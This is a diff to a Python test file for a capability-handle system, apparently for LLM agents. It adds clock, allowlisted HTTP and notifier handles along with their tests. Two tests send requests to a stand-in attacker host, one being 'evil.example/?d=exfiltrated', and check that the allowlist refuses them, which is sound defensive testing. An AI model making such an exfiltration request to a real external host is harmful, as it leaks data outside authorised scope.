@@ -15,8 +15,11 @@ from poc.handles import (
     AppendDBHandle,
     CapabilityError,
     Caretaker,
+    Clock,
     EventEmitter,
+    HTTPClient,
     InferenceLLM,
+    Notifier,
     ReadDBHandle,
     ReadWriteDBHandle,
     ResponseChannel,
@@ -24,6 +27,7 @@ from poc.handles import (
     Revoker,
     Rotator,
     ToolLLM,
+    WallTime,
     manage,
     provision,
     revocable,
@@ -106,6 +110,52 @@ def test_append_db_handle_has_no_read_method():
 def test_sinks_are_write_only():
     assert not hasattr(ResponseChannel("s"), "read")
     assert not hasattr(EventEmitter("t"), "read")
+    assert not hasattr(Notifier("digest"), "read")
+
+
+# ── I/O handles: clock, outbound HTTP, notification ────────────────
+
+
+def test_clock_reads_time_and_nothing_else():
+    """`Clock` grants exactly one observation: the current wall time. There is
+    no setter and no scheduling surface — reading the world's time is the whole
+    of the authority."""
+    clock = Clock(_source=lambda: WallTime(seconds=1_700_000_000, nanoseconds=42))
+    t = clock.now()
+    assert (t.seconds, t.nanoseconds) == (1_700_000_000, 42)
+    assert not hasattr(clock, "set")
+    assert not hasattr(clock, "sleep")
+
+
+def test_http_client_serves_an_allowlisted_host():
+    http = HTTPClient(
+        allowlist=frozenset({"feeds.example.com"}),
+        _responses={"https://feeds.example.com/a.xml": "<rss/>"},
+    )
+    assert http.get("https://feeds.example.com/a.xml") == "<rss/>"
+
+
+def test_http_client_refuses_a_host_outside_its_allowlist():
+    """The allowlist is enforced at the handle, exactly as `ToolLLM` refuses an
+    out-of-scope tool: the node holds the operation, the handle holds the scope."""
+    http = HTTPClient(allowlist=frozenset({"feeds.example.com"}))
+    with pytest.raises(CapabilityError, match=r"evil\.example"):
+        http.get("https://evil.example/?d=exfiltrated")
+
+
+def test_http_client_refuses_an_unparseable_host():
+    """A URL with no discernible host cannot be checked against the allowlist,
+    so it is refused rather than waved through — fail closed."""
+    http = HTTPClient(allowlist=frozenset({"feeds.example.com"}))
+    with pytest.raises(CapabilityError):
+        http.get("not a url")
+
+
+def test_notifier_is_a_write_only_channel_sink():
+    n = Notifier("digest")
+    n.notify("3 items today")
+    assert n.sent == ["3 items today"]
+    assert n.channel == "digest"
 
 
 # ── Provisioning: capability type string → handle ──────────────────
@@ -121,11 +171,37 @@ def test_sinks_are_write_only():
         ("DBHandle<'audit', append>", AppendDBHandle),
         ("ResponseChannel<user-session>", ResponseChannel),
         ("EventEmitter<'support-queue'>", EventEmitter),
+        ("Clock", Clock),
+        ("HTTPClient<['feeds.example.com']>", HTTPClient),
+        ("Notifier<'digest'>", Notifier),
     ],
 )
 def test_provision_builds_the_right_handle(cap, expected):
     handle = provision(cap, backend=StubLLM(), stores=STORES)
     assert isinstance(handle, expected)
+
+
+def test_provisioned_http_client_carries_exactly_its_declared_allowlist():
+    handle = provision(
+        "HTTPClient<['feeds.example.com', 'blog.example.net']>",
+        backend=StubLLM(),
+        stores=STORES,
+        web={"https://feeds.example.com/a.xml": "<rss/>"},
+    )
+    assert isinstance(handle, HTTPClient)
+    assert handle.allowlist == frozenset({"feeds.example.com", "blog.example.net"})
+    assert handle.get("https://feeds.example.com/a.xml") == "<rss/>"
+    with pytest.raises(CapabilityError):
+        handle.get("https://evil.example/")
+
+
+def test_provision_rejects_a_malformed_http_allowlist():
+    """An empty or non-literal allowlist grants nothing checkable and is refused
+    at provisioning, not discovered at the first request."""
+    with pytest.raises(ValueError, match="HTTPClient"):
+        provision("HTTPClient<[]>", backend=StubLLM(), stores=STORES)
+    with pytest.raises(ValueError, match="HTTPClient"):
+        provision("HTTPClient<[bare-name]>", backend=StubLLM(), stores=STORES)
 
 
 def test_provision_rejects_an_unmodelled_db_mode():
